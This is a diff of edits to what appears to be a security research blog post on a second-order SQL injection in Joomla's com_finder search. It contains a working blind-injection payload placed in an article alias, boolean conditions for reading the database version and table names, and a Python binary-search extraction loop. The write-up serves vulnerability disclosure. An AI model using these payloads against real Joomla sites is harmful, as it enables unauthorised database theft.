@@ -150,7 +150,7 @@ Both are **second-order SQL injections**.
 - Joomla accidentally stores the loaded title as an array key instead of a value
 - `SearchModel::getListQuery` later treats that key as a numeric taxonomy id and concatenates it into an `IN (...)` **SQL** expression without sanitization
 
-Below I will focus on the one in `com_finder`.
+Below I will focus on the vulnerability in `com_finder`.
 
 # The Vulnerability In com_finder
 
@@ -226,7 +226,7 @@ The trigger is a frontend **Finder** search request. The `q` parameter is the **
 GET /index.php?option=com_finder&view=search&q=<article-title>+author:<prefix>
 ```
 
-[SearchModel.php::populateState()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L472-L511) reads `q` with `getString()` and creates a **Finder** query object:
+In our example we can use `q=1337` and `author:13371337`. [SearchModel.php::populateState()](https://github.com/joomla/joomla-cms/blob/5.4.5/components/com_finder/src/Model/SearchModel.php#L472-L511) reads `q` with `getString()` and creates a **Finder** query object:
 
 ```php
 $options['input'] = $input->getString('q', $params->get('q', ''));
@@ -315,18 +315,18 @@ The payload `13371337*0+IF((1=1),t.node_id,0)` was created to work exactly in th
 
 - `13371337` is just a random numeric marker. The public search later uses something like `author:13371337`, so the prefix lookup loads the full stored taxonomy title with `LIKE '13371337%'`
 - `*0` makes the marker contribute literally `0` to the expression. This lets the payload start with the searchable numeric prefix without changing the result of the following `IF(...)` expression
-- `IF((1=1),t.node_id,0)` is a **MySQL** conditional expression. For real extraction, the `1=1` test is replaced with a boolean condition, for example `ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET 0),1,1)) >= 109`. This reads the first character of the first table name in the current database, converts it to its **ASCII** number, and checks whether that number is at least `109`, which corresponds to the **ASCII** character `m`. By using this, we can dump data such as table names
+- `IF((1=1),t.node_id,0)` is a **MySQL** conditional expression. For real extraction, the `1=1` test is replaced with a boolean condition, for example `ASCII( SUBSTR( VERSION(), 1, 1 ) ) >= 53`. This reads the first character of the database version, converts it to its **ASCII** number, and checks whether that number is at least `53`, which corresponds to the **ASCII** character `5`
 - `t.node_id` comes from [Joomla](https://github.com/joomla/joomla-cms)'s own query. Because the payload is wrapped with `t.node_id IN (...)`, it returns either the current `t.node_id` or `0` depending on the condition
 
 This turns the search result page into a **boolean oracle**. Triggering a `True` condition by creating an article with the alias `13371337*0+IF((1=1),t.node_id,0)` looks like this:
 
 ![Finder search returning results for the true SQL condition](blog/posts/joomla-sqli/finder-search-true-browser.png "Finder true condition")
 
-The `False` condition returns nothing through the search filter after creating an article with the alias `73317331*0+IF((1=0),t.node_id,0)`:
+The `False` condition returns nothing through the search filter after creating an article with the alias `13371337*0+IF((1=0),t.node_id,0)`:
 
 ![Finder search returning no results for the false SQL condition](blog/posts/joomla-sqli/finder-search-false-browser.png "Finder false condition")
 
-The very simplified extraction script to get the database version looks like this:
+The very simplified extraction script to dump the whole database version looks like this:
 
 ```python
 def cond(pos, mid):
@@ -340,7 +340,7 @@ for pos in range(1, 65):
     while lo < hi:
         mid = (lo + hi + 1) // 2
         alias_payload = f"{prefix}*0+IF(({cond(pos, mid)}),t.node_id,0)"
-        create_or_edit_article(session, article, title, alias_payload)
+        save_article(session, article, title, alias_payload)
         ok = probe(prefix, term)
 
         if ok:
@@ -352,7 +352,7 @@ for pos in range(1, 65):
         break
 ```
 
-`title` just has to be a normal indexed word from the published article, while `author:<prefix>` triggers the vulnerable taxonomy filter. Then we can do a **binary search** to extract the database version character by character through the **boolean oracle**. Besides dumping the database version, we could also dump the whole database by enumerating all the available tables.
+`title` just has to be a normal indexed word from the published article, while `author:<prefix>` triggers the vulnerable taxonomy filter with the alias payload. Then we can do a **binary search** to extract the database version character by character through the **boolean oracle**. Besides dumping the database version, we could also dump the whole database by enumerating all the available tables.
 
 # The Fix
 
